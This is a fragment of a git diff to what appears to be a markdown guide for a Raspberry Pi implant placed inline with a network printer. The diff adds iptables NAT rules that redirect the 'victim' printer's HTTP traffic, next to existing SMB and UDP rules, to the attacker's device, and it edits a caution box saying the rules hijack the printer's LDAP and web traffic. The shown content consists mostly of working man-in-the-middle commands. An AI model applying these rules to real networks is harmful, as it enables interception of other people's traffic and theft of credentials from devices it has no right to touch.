@@ -191,11 +191,14 @@ sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 
 sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 445 -j DNAT --to-destination 169.254.66.66:445
 # LLMNR / Multicast (UDP 5553)
 sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p udp --dport 5553 -j DNAT --to-destination 169.254.66.66:5553
+# HTTP (TCP 80)
+sudo iptables -t nat -A PREROUTING -i br0 -d <VICTIM-PRINTER-IP> -p tcp --dport 80 -j DNAT --to-destination 169.254.66.66:80
+# may add more like LDAP, SMTP, DNS..
 ````
 
 >[!CAUTION]
-> This will actively mangle with the printer's network packages and features.
-> You basically rewrite important packets to your RPi and the printer won't see them anymore.
+> This will actively mangle with the printer's network packages and features (ldap, printer http page, etc.).
+> You basically rewrite important packets to your RPi.
 
 In case you want to remove those iptables rules:
 
